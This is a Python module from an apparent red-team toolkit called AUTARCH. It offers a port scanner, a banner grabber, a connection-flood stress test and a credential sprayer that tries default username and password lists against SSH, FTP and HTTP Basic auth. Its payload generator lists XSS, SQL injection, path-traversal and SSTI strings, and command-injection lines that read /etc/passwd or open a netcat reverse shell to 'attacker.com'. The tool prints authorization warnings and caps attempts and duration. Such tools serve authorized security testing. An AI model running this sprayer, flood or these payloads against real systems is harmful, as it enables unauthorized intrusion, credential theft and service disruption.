"""
AUTARCH Simulate Module
Attack simulation and security testing

Red team exercises and controlled attack simulations.
"""

import os
import sys
import subprocess
import socket
import hashlib
import random
import string
import time
import ftplib
import base64
import urllib.request
from pathlib import Path
from datetime import datetime

# Module metadata
DESCRIPTION = "Attack simulation & red team tools"
AUTHOR = "darkHal"
VERSION = "1.0"
CATEGORY = "simulate"

sys.path.insert(0, str(Path(__file__).parent.parent))
from core.banner import Colors, clear_screen, display_banner


class Simulator:
    """Attack simulation tools."""

    def __init__(self):
        pass

    def print_status(self, message: str, status: str = "info"):
        colors = {"info": Colors.CYAN, "success": Colors.GREEN, "warning": Colors.YELLOW, "error": Colors.RED}
        symbols = {"info": "*", "success": "+", "warning": "!", "error": "X"}
        print(f"{colors.get(status, Colors.WHITE)}[{symbols.get(status, '*')}] {message}{Colors.RESET}")

    def run_cmd(self, cmd: str, timeout: int = 60) -> tuple:
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
            return result.returncode == 0, result.stdout.strip()
        except:
            return False, ""

    def password_audit(self):
        """Audit password strength and check common passwords."""
        print(f"\n{Colors.BOLD}Password Audit{Colors.RESET}")
        print(f"{Colors.DIM}Test password strength against common patterns{Colors.RESET}\n")

        password = input(f"{Colors.WHITE}Enter password to test: {Colors.RESET}")
        if not password:
            return

        print(f"\n{Colors.CYAN}Analyzing password...{Colors.RESET}\n")

        score = 0
        feedback = []

        # Length check
        if len(password) >= 16:
            score += 3
            feedback.append(f"{Colors.GREEN}+ Excellent length (16+){Colors.RESET}")
        elif len(password) >= 12:
            score += 2
            feedback.append(f"{Colors.GREEN}+ Good length (12+){Colors.RESET}")
        elif len(password) >= 8:
            score += 1
            feedback.append(f"{Colors.YELLOW}~ Minimum length (8+){Colors.RESET}")
        else:
            feedback.append(f"{Colors.RED}- Too short (<8){Colors.RESET}")

        # Character diversity
        has_upper = any(c.isupper() for c in password)
        has_lower = any(c.islower() for c in password)
        has_digit = any(c.isdigit() for c in password)
        has_special = any(c in '!@#$%^&*()_+-=[]{}|;:,.<>?' for c in password)

        if has_upper:
            score += 1
            feedback.append(f"{Colors.GREEN}+ Contains uppercase{Colors.RESET}")
        else:
            feedback.append(f"{Colors.RED}- No uppercase letters{Colors.RESET}")

        if has_lower:
            score += 1
            feedback.append(f"{Colors.GREEN}+ Contains lowercase{Colors.RESET}")
        else:
            feedback.append(f"{Colors.RED}- No lowercase letters{Colors.RESET}")

        if has_digit:
            score += 1
            feedback.append(f"{Colors.GREEN}+ Contains numbers{Colors.RESET}")
        else:
            feedback.append(f"{Colors.RED}- No numbers{Colors.RESET}")

        if has_special:
            score += 2
            feedback.append(f"{Colors.GREEN}+ Contains special characters{Colors.RESET}")
        else:
            feedback.append(f"{Colors.YELLOW}~ No special characters{Colors.RESET}")

        # Common patterns
        common_patterns = ['password', '123456', 'qwerty', 'letmein', 'admin', 'welcome', 'monkey', 'dragon']
        if password.lower() in common_patterns:
            score = 0
            feedback.append(f"{Colors.RED}- Extremely common password!{Colors.RESET}")

        # Sequential characters
        if any(password[i:i+3].lower() in 'abcdefghijklmnopqrstuvwxyz' for i in range(len(password)-2)):
            score -= 1
            feedback.append(f"{Colors.YELLOW}~ Contains sequential letters{Colors.RESET}")

        if any(password[i:i+3] in '0123456789' for i in range(len(password)-2)):
            score -= 1
            feedback.append(f"{Colors.YELLOW}~ Contains sequential numbers{Colors.RESET}")

        # Keyboard patterns
        keyboard_patterns = ['qwerty', 'asdf', 'zxcv', '1qaz', '2wsx']
        for pattern in keyboard_patterns:
            if pattern in password.lower():
                score -= 1
                feedback.append(f"{Colors.YELLOW}~ Contains keyboard pattern{Colors.RESET}")
                break

        # Display results
        for line in feedback:
            print(f"  {line}")

        print(f"\n{Colors.BOLD}Score: {max(0, score)}/10{Colors.RESET}")

        if score >= 8:
            print(f"{Colors.GREEN}Strength: STRONG{Colors.RESET}")
        elif score >= 5:
            print(f"{Colors.YELLOW}Strength: MODERATE{Colors.RESET}")
        else:
            print(f"{Colors.RED}Strength: WEAK{Colors.RESET}")

        # Hash generation
        print(f"\n{Colors.CYAN}Password Hashes:{Colors.RESET}")
        print(f"  MD5:    {hashlib.md5(password.encode()).hexdigest()}")
        print(f"  SHA1:   {hashlib.sha1(password.encode()).hexdigest()}")
        print(f"  SHA256: {hashlib.sha256(password.encode()).hexdigest()}")

    def port_scanner(self):
        """TCP port scanner."""
        print(f"\n{Colors.BOLD}Port Scanner{Colors.RESET}")

        target = input(f"{Colors.WHITE}Enter target IP/hostname: {Colors.RESET}").strip()
        if not target:
            return

        port_range = input(f"{Colors.WHITE}Port range (e.g., 1-1000) [1-1024]: {Colors.RESET}").strip() or "1-1024"

        try:
            start_port, end_port = map(int, port_range.split('-'))
        except:
            self.print_status("Invalid port range", "error")
            return

        # Resolve hostname
        try:
            ip = socket.gethostbyname(target)
            if ip != target:
                print(f"\n{Colors.DIM}Resolved {target} to {ip}{Colors.RESET}")
        except:
            self.print_status(f"Could not resolve {target}", "error")
            return

        print(f"\n{Colors.CYAN}Scanning {target} ports {start_port}-{end_port}...{Colors.RESET}\n")

        open_ports = []
        scanned = 0
        total = end_port - start_port + 1

        for port in range(start_port, end_port + 1):
            scanned += 1
            if scanned % 100 == 0:
                print(f"\r{Colors.DIM}Progress: {scanned}/{total} ports scanned...{Colors.RESET}", end="")

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)

            result = sock.connect_ex((ip, port))
            if result == 0:
                open_ports.append(port)
            sock.close()

        print(f"\r{' ' * 50}\r", end="")  # Clear progress line

        if open_ports:
            print(f"{Colors.GREEN}Open ports found:{Colors.RESET}\n")
            services = {
                21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp", 53: "dns",
                80: "http", 110: "pop3", 143: "imap", 443: "https", 445: "smb",
                3306: "mysql", 3389: "rdp", 5432: "postgresql", 8080: "http-proxy"
            }
            for port in open_ports:
                service = services.get(port, "unknown")
                print(f"  {port:5}/tcp    open    {service}")
        else:
            print(f"{Colors.YELLOW}No open ports found in range{Colors.RESET}")

        print(f"\n{Colors.DIM}Scanned {total} ports{Colors.RESET}")

    def banner_grabber(self):
        """Grab service banners."""
        print(f"\n{Colors.BOLD}Banner Grabber{Colors.RESET}")

        target = input(f"{Colors.WHITE}Enter target IP/hostname: {Colors.RESET}").strip()
        port = input(f"{Colors.WHITE}Enter port [80]: {Colors.RESET}").strip() or "80"

        if not target:
            return

        try:
            port = int(port)
        except:
            self.print_status("Invalid port", "error")
            return

        print(f"\n{Colors.CYAN}Grabbing banner from {target}:{port}...{Colors.RESET}\n")

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target, port))

            # Send HTTP request for web ports
            if port in [80, 443, 8080, 8443]:
                sock.send(b"HEAD / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
            else:
                sock.send(b"\r\n")

            banner = sock.recv(1024).decode('utf-8', errors='ignore')
            sock.close()

            if banner:
                print(f"{Colors.GREEN}Banner:{Colors.RESET}")
                for line in banner.split('\n')[:15]:
                    print(f"  {line.strip()}")
            else:
                print(f"{Colors.YELLOW}No banner received{Colors.RESET}")

        except socket.timeout:
            self.print_status("Connection timed out", "warning")
        except ConnectionRefusedError:
            self.print_status("Connection refused", "error")
        except Exception as e:
            self.print_status(f"Error: {e}", "error")

    def payload_generator(self):
        """Generate various payloads for testing."""
        print(f"\n{Colors.BOLD}Payload Generator{Colors.RESET}")
        print(f"{Colors.DIM}Generate test payloads for security testing{Colors.RESET}\n")

        print(f"  {Colors.YELLOW}[1]{Colors.RESET} XSS Payloads")
        print(f"  {Colors.YELLOW}[2]{Colors.RESET} SQL Injection Payloads")
        print(f"  {Colors.YELLOW}[3]{Colors.RESET} Command Injection Payloads")
        print(f"  {Colors.YELLOW}[4]{Colors.RESET} Path Traversal Payloads")
        print(f"  {Colors.YELLOW}[5]{Colors.RESET} SSTI Payloads")
        print()

        choice = input(f"{Colors.WHITE}Select payload type: {Colors.RESET}").strip()

        payloads = {
            "1": [  # XSS
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                '"><script>alert(1)</script>',
                "'-alert(1)-'",
                '<body onload=alert(1)>',
                '{{constructor.constructor("alert(1)")()}}',
            ],
            "2": [  # SQLi
                "' OR '1'='1",
                "' OR '1'='1' --",
                "'; DROP TABLE users; --",
                "1' ORDER BY 1--",
                "1 UNION SELECT null,null,null--",
                "' AND 1=1 --",
                "admin'--",
            ],
            "3": [  # Command Injection
                "; ls -la",
                "| cat /etc/passwd",
                "& whoami",
                "`id`",
                "$(whoami)",
                "; ping -c 3 127.0.0.1",
                "| nc -e /bin/sh attacker.com 4444",
            ],
            "4": [  # Path Traversal
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc/passwd",
                "/etc/passwd%00",
            ],
            "5": [  # SSTI
                "{{7*7}}",
                "${7*7}",
                "{{config}}",
                "{{self.__class__.__mro__}}",
                "<%= 7*7 %>",
                "{{request.application.__globals__}}",
            ],
        }

        if choice in payloads:
            names = {
                "1": "XSS", "2": "SQL Injection", "3": "Command Injection",
                "4": "Path Traversal", "5": "SSTI"
            }
            print(f"\n{Colors.CYAN}{names[choice]} Payloads:{Colors.RESET}\n")
            for i, payload in enumerate(payloads[choice], 1):
                print(f"  [{i}] {payload}")

    def network_stress(self):
        """Network stress test (controlled)."""
        print(f"\n{Colors.BOLD}Network Stress Test{Colors.RESET}")
        print(f"{Colors.RED}WARNING: Only use on systems you own or have permission to test!{Colors.RESET}\n")

        target = input(f"{Colors.WHITE}Enter target IP: {Colors.RESET}").strip()
        port = input(f"{Colors.WHITE}Enter target port: {Colors.RESET}").strip()
        duration = input(f"{Colors.WHITE}Duration in seconds [5]: {Colors.RESET}").strip() or "5"

        if not target or not port:
            return

        try:
            port = int(port)
            duration = int(duration)
            if duration > 30:
                duration = 30
                print(f"{Colors.YELLOW}Limited to 30 seconds max{Colors.RESET}")
        except:
            self.print_status("Invalid input", "error")
            return

        confirm = input(f"\n{Colors.YELLOW}Start stress test against {target}:{port} for {duration}s? (yes/no): {Colors.RESET}").strip()
        if confirm.lower() != 'yes':
            return

        print(f"\n{Colors.CYAN}Starting stress test...{Colors.RESET}")

        import time
        start_time = time.time()
        connections = 0
        errors = 0

        while time.time() - start_time < duration:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((target, port))
                sock.send(b"X" * 1024)
                sock.close()
                connections += 1
            except:
                errors += 1

            if connections % 100 == 0:
                print(f"\r{Colors.DIM}Connections: {connections}, Errors: {errors}{Colors.RESET}", end="")

        print(f"\n\n{Colors.GREEN}Test complete:{Colors.RESET}")
        print(f"  Connections attempted: {connections}")
        print(f"  Errors: {errors}")
        print(f"  Duration: {duration}s")

    # ==================== CREDENTIAL SPRAYER ====================

    DEFAULT_USERNAMES = [
        'admin', 'root', 'user', 'test', 'guest', 'administrator', 'ftp',
        'www', 'postgres', 'mysql', 'oracle', 'backup', 'operator', 'info',
        'support', 'webmaster', 'demo', 'pi', 'ubuntu', 'deploy',
    ]

    DEFAULT_PASSWORDS = [
        'password', '123456', 'admin', 'root', 'letmein', 'welcome',
        'changeme', 'test', 'guest', 'default', 'pass', 'qwerty',
        '123456789', 'password1', '12345678', '1234', 'abc123',
        'monkey', 'master', 'dragon',
    ]

    def credential_sprayer(self):
        """Credential spraying against network services."""
        print(f"\n{Colors.BOLD}Credential Sprayer{Colors.RESET}")
        print(f"{Colors.RED}WARNING: Only use on systems you own or have explicit authorization to test!{Colors.RESET}")
        print(f"{Colors.DIM}Test common credentials against network services{Colors.RESET}")
        print(f"{Colors.CYAN}{'─' * 50}{Colors.RESET}\n")

        # Protocol selection
        print(f"  {Colors.YELLOW}[1]{Colors.RESET} SSH")
        print(f"  {Colors.YELLOW}[2]{Colors.RESET} FTP")
        print(f"  {Colors.YELLOW}[3]{Colors.RESET} HTTP Basic Auth")
        print()

        proto_choice = input(f"{Colors.WHITE}Select protocol: {Colors.RESET}").strip()
        protocols = {'1': 'ssh', '2': 'ftp', '3': 'http'}
        protocol = protocols.get(proto_choice)
        if not protocol:
            return

        default_ports = {'ssh': '22', 'ftp': '21', 'http': '80'}
        target = input(f"{Colors.WHITE}Target IP/hostname: {Colors.RESET}").strip()
        if not target:
            return

        port = input(f"{Colors.WHITE}Port [{Colors.GREEN}{default_ports[protocol]}{Colors.WHITE}]: {Colors.RESET}").strip() or default_ports[protocol]
        try:
            port = int(port)
        except ValueError:
            self.print_status("Invalid port", "error")
            return

        # Username source
        print(f"\n{Colors.CYAN}Username source:{Colors.RESET}")
        print(f"  {Colors.YELLOW}[1]{Colors.RESET} Built-in top 20")
        print(f"  {Colors.YELLOW}[2]{Colors.RESET} Manual entry")
        print(f"  {Colors.YELLOW}[3]{Colors.RESET} File")

        user_choice = input(f"{Colors.WHITE}Select: {Colors.RESET}").strip()
        usernames = []
        if user_choice == '1':
            usernames = self.DEFAULT_USERNAMES[:]
        elif user_choice == '2':
            user_input = input(f"{Colors.WHITE}Usernames (comma-separated): {Colors.RESET}").strip()
            usernames = [u.strip() for u in user_input.split(',') if u.strip()]
        elif user_choice == '3':
            filepath = input(f"{Colors.WHITE}Username file path: {Colors.RESET}").strip()
            try:
                with open(filepath, 'r') as f:
                    usernames = [line.strip() for line in f if line.strip()]
            except Exception as e:
                self.print_status(f"Error reading file: {e}", "error")
                return

        if not usernames:
            self.print_status("No usernames provided", "error")
            return

        # Password source
        print(f"\n{Colors.CYAN}Password source:{Colors.RESET}")
        print(f"  {Colors.YELLOW}[1]{Colors.RESET} Built-in top 20")
        print(f"  {Colors.YELLOW}[2]{Colors.RESET} Manual entry")
        print(f"  {Colors.YELLOW}[3]{Colors.RESET} File")

        pass_choice = input(f"{Colors.WHITE}Select: {Colors.RESET}").strip()
        passwords = []
        if pass_choice == '1':
            passwords = self.DEFAULT_PASSWORDS[:]
        elif pass_choice == '2':
            pass_input = input(f"{Colors.WHITE}Passwords (comma-separated): {Colors.RESET}").strip()
            passwords = [p.strip() for p in pass_input.split(',') if p.strip()]
        elif pass_choice == '3':
            filepath = input(f"{Colors.WHITE}Password file path: {Colors.RESET}").strip()
            try:
                with open(filepath, 'r') as f:
                    passwords = [line.strip() for line in f if line.strip()]
            except Exception as e:
                self.print_status(f"Error reading file: {e}", "error")
                return

        if not passwords:
            self.print_status("No passwords provided", "error")
            return

        # Delay and confirmation
        delay = input(f"{Colors.WHITE}Delay between attempts (seconds) [{Colors.GREEN}1.0{Colors.WHITE}]: {Colors.RESET}").strip() or "1.0"
        try:
            delay = max(0.5, float(delay))  # Enforce minimum 0.5s
        except ValueError:
            delay = 1.0

        total_combos = len(usernames) * len(passwords)
        est_time = total_combos * delay

        print(f"\n{Colors.CYAN}{'─' * 50}{Colors.RESET}")
        print(f"  Protocol:     {protocol.upper()}")
        print(f"  Target:       {target}:{port}")
        print(f"  Usernames:    {len(usernames)}")
        print(f"  Passwords:    {len(passwords)}")
        print(f"  Combinations: {total_combos}")
        print(f"  Delay:        {delay}s")
        print(f"  Est. time:    {int(est_time)}s ({int(est_time/60)}m)")
        print(f"{Colors.CYAN}{'─' * 50}{Colors.RESET}")

        confirm = input(f"\n{Colors.YELLOW}Start credential spray? (yes/no): {Colors.RESET}").strip().lower()
        if confirm != 'yes':
            return

        results = self._run_spray(protocol, target, port, usernames, passwords, delay)

        # Summary
        print(f"\n{Colors.CYAN}{'─' * 50}{Colors.RESET}")
        print(f"{Colors.BOLD}Spray Complete{Colors.RESET}")
        print(f"  Attempts: {total_combos}")
        print(f"  Successes: {Colors.GREEN}{len(results)}{Colors.RESET}")

        if results:
            print(f"\n{Colors.GREEN}Valid Credentials:{Colors.RESET}")
            for r in results:
                print(f"  {Colors.GREEN}[+]{Colors.RESET} {r['user']}:{r['password']}")

    def _spray_ssh(self, target: str, port: int, user: str, password: str) -> bool:
        """Try SSH login with given credentials."""
        try:
            import paramiko
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(target, port=port, username=user, password=password, timeout=5,
                          allow_agent=False, look_for_keys=False)
            client.close()
            return True
        except ImportError:
            # Fallback to sshpass
            success, _ = self.run_cmd(
                f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -p {port} {user}@{target} exit",
                timeout=10
            )
            return success
        except:
            return False

    def _spray_ftp(self, target: str, port: int, user: str, password: str) -> bool:
        """Try FTP login with given credentials."""
        try:
            ftp = ftplib.FTP()
            ftp.connect(target, port, timeout=5)
            ftp.login(user, password)
            ftp.quit()
            return True
        except:
            return False

    def _spray_http_basic(self, target: str, port: int, user: str, password: str) -> bool:
        """Try HTTP Basic Auth with given credentials."""
        try:
            url = f"http://{target}:{port}/"
            credentials = base64.b64encode(f"{user}:{password}".encode()).decode()
            req = urllib.request.Request(url, headers={
                'Authorization': f'Basic {credentials}',
                'User-Agent': 'Mozilla/5.0',
            })
            with urllib.request.urlopen(req, timeout=5) as response:
                return response.getcode() not in [401, 403]
        except urllib.error.HTTPError as e:
            return e.code not in [401, 403]
        except:
            return False

    def _run_spray(self, protocol: str, target: str, port: int,
                   usernames: list, passwords: list, delay: float = 1.0) -> list:
        """Execute the credential spray."""
        spray_funcs = {
            'ssh': self._spray_ssh,
            'ftp': self._spray_ftp,
            'http': self._spray_http_basic,
        }

        spray_func = spray_funcs.get(protocol)
        if not spray_func:
            self.print_status(f"Unsupported protocol: {protocol}", "error")
            return []

        successes = []
        attempt = 0
        max_attempts = 500

        print(f"\n{Colors.CYAN}Starting spray...{Colors.RESET}\n")

        for user in usernames:
            for password in passwords:
                attempt += 1
                if attempt > max_attempts:
                    self.print_status(f"Max attempts ({max_attempts}) reached", "warning")
                    return successes

                print(f"\r{Colors.DIM}  [{attempt}] Trying {user}:{password[:15]}...{Colors.RESET}", end='', flush=True)

                try:
                    result = spray_func(target, port, user, password)
                    if result:
                        print(f"\r{' ' * 60}\r  {Colors.GREEN}[+] SUCCESS: {user}:{password}{Colors.RESET}")
                        successes.append({'user': user, 'password': password})
                except:
                    pass

                time.sleep(delay)

        print(f"\r{' ' * 60}\r", end='')
        return successes

    def show_menu(self):
        clear_screen()
        display_banner()

        print(f"{Colors.YELLOW}{Colors.BOLD}  Attack Simulation{Colors.RESET}")
        print(f"{Colors.DIM}  Red team exercises and testing{Colors.RESET}")
        print(f"{Colors.DIM}  {'─' * 50}{Colors.RESET}")
        print()
        print(f"  {Colors.YELLOW}[1]{Colors.RESET} Password Audit")
        print(f"  {Colors.YELLOW}[2]{Colors.RESET} Port Scanner")
        print(f"  {Colors.YELLOW}[3]{Colors.RESET} Banner Grabber")
        print(f"  {Colors.YELLOW}[4]{Colors.RESET} Payload Generator")
        print(f"  {Colors.YELLOW}[5]{Colors.RESET} Network Stress Test")
        print(f"  {Colors.YELLOW}[6]{Colors.RESET} Credential Sprayer")
        print()
        print(f"  {Colors.DIM}[0]{Colors.RESET} Back")
        print()

    def run(self):
        while True:
            self.show_menu()
            try:
                choice = input(f"{Colors.WHITE}  Select: {Colors.RESET}").strip()

                if choice == "0":
                    break
                elif choice == "1":
                    self.password_audit()
                elif choice == "2":
                    self.port_scanner()
                elif choice == "3":
                    self.banner_grabber()
                elif choice == "4":
                    self.payload_generator()
                elif choice == "5":
                    self.network_stress()
                elif choice == "6":
                    self.credential_sprayer()

                if choice in ["1", "2", "3", "4", "5", "6"]:
                    input(f"\n{Colors.WHITE}Press Enter to continue...{Colors.RESET}")

            except (EOFError, KeyboardInterrupt):
                break


def run():
    Simulator().run()


if __name__ == "__main__":
    run()
